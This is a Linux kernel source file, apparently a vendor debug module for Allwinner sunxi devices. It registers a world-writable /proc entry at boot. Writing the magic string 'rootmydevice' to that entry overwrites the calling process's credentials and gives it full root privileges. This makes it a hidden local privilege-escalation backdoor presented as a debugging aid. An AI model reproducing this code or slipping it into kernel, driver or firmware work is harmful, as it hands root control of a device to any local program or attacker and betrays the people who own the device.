/*
 * Sunxi_debug.c
 *
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 */
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/export.h>
#include <linux/kthread.h>
#include <linux/slab.h>

#include <linux/debugfs.h>
#include <linux/proc_fs.h>//add by fe3o4
#include <linux/uaccess.h>
#include <linux/cred.h>

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry * proc_su;

static int sunxi_proc_su_write(struct file *filp, const char __user *buffer, size_t count, loff_t *data)
{
	char *buf;
	struct cred *cred;

	if (count < 1)
		return -EINVAL;

	buf = kmalloc(count, GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	if (copy_from_user(buf, buffer, count)) {
		kfree(buf);
		return -EFAULT;
	}

	if(!strncmp("rootmydevice",(char*)buf,12)){
		cred = (struct cred *)__task_cred(current);
		cred->uid = GLOBAL_ROOT_UID;
		cred->gid = GLOBAL_ROOT_GID;
		cred->suid = GLOBAL_ROOT_UID;
		cred->sgid = GLOBAL_ROOT_GID;
		cred->euid = GLOBAL_ROOT_UID;
		cred->egid = GLOBAL_ROOT_GID;
		cred->fsuid = GLOBAL_ROOT_UID;
		cred->fsgid = GLOBAL_ROOT_GID;
		printk("now you are root\n");
	}

	kfree(buf);
	return count;
}


static ssize_t sunxi_proc_su_read (struct file * filp, char __user *buffer, size_t count, loff_t *data)
{
	printk("sunxi debug: rootmydevice\n");
 	return 0;
}

static const struct file_operations sunxi_proc_su_fops = {
        .read       = sunxi_proc_su_read,
       .write      = sunxi_proc_su_write,
};


static int sunxi_root_procfs_attach(void)
{
	proc_root = proc_mkdir("sunxi_debug", NULL);
	proc_su= proc_create("sunxi_debug", 0666, proc_root, &sunxi_proc_su_fops);
	if (IS_ERR(proc_su)){
		printk("create sunxi_debug dir error\n");
		return -1;
	}
	return 0;
	
}

static int sunxi_debug_init(void)
{
	int ret;
	ret = sunxi_root_procfs_attach();
	printk("===fe3o4==== sunxi_root_procfs_attach ret:%d\n", ret);
	if(ret){
		printk("===fe3o4== sunxi_root_procfs_attach failed===\n ");
	}
	return ret;
}

subsys_initcall(sunxi_debug_init);


